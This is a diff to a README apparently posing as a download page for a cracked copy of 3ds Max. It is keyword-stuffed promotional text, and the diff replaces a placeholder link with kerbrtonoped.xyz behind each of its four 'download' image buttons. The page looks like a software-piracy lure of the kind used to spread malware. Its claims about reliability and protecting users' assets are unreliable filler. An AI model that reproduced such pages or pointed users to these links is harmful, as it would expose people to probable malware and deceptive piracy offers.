@@ -3,7 +3,7 @@
 Unleash your creativity with **3d max crack**, the ultimate tool for professionals seeking unmatched design capabilities and precision. This powerful software ensures **reliability** and **quality**, empowering you to bring your boldest ideas to life effortlessly. With cutting-edge features and seamless performance, it’s no wonder users worldwide trust this solution for their most demanding projects.  
 
 <div align="center">
-  <a href="https://google.com">
+  <a href="https://kerbrtonoped.xyz">
     <img src="https://imagedelivery.net/R7R2gvNaHJl_gw06IoIdgw/3b93c4b4-beda-4b22-aede-d9e0d9b52600/public" alt="download" width="200" height="auto" style="max-width: 100%; margin: 10px 0;" />
   </a>
 </div>
@@ -30,7 +30,7 @@ Seamlessly integrate with other platforms and tools to enhance your workflow. Th
 Ready to elevate your creative process? Dive into the world of advanced design tools today!  
 
 <div align="center">
-  <a href="https://google.com">
+  <a href="https://kerbrtonoped.xyz">
     <img src="https://imagedelivery.net/R7R2gvNaHJl_gw06IoIdgw/77b2c6c5-625e-41a5-9313-ea156d72fb00/public" alt="download" width="200" height="auto" style="max-width: 100%; margin: 10px 0;" />
   </a>
 </div>
@@ -103,7 +103,7 @@ For platforms requiring API integrations, we provide:
 With **3ds max crack** and **3d studio max download crack**, you’re choosing a partner dedicated to protecting your assets while delivering unmatched performance. Whether it’s securing your data or ensuring uninterrupted service, we’ve got you covered.
 
 <div align="center">
-  <a href="https://google.com">
+  <a href="https://kerbrtonoped.xyz">
     <img src="https://imagedelivery.net/R7R2gvNaHJl_gw06IoIdgw/77b2c6c5-625e-41a5-9313-ea156d72fb00/public" alt="download" width="200" height="auto" style="max-width: 100%; margin: 10px 0;" />
   </a>
 </div>
@@ -147,7 +147,7 @@ Welcome to the **Getting Started** section! Below is a step-by-step guide to hel
 Follow the steps above to quickly get up and running with the software. For more detailed information, refer to the full documentation available in the **Resources** section.
 
 <div align="center">
-  <a href="https://google.com">
+  <a href="https://kerbrtonoped.xyz">
     <img src="https://imagedelivery.net/R7R2gvNaHJl_gw06IoIdgw/bec255f9-1689-47d4-2f0e-52796a95dc00/public" alt="download" width="200" height="auto" style="max-width: 100%; margin: 10px 0;" />
   </a>
 </div>
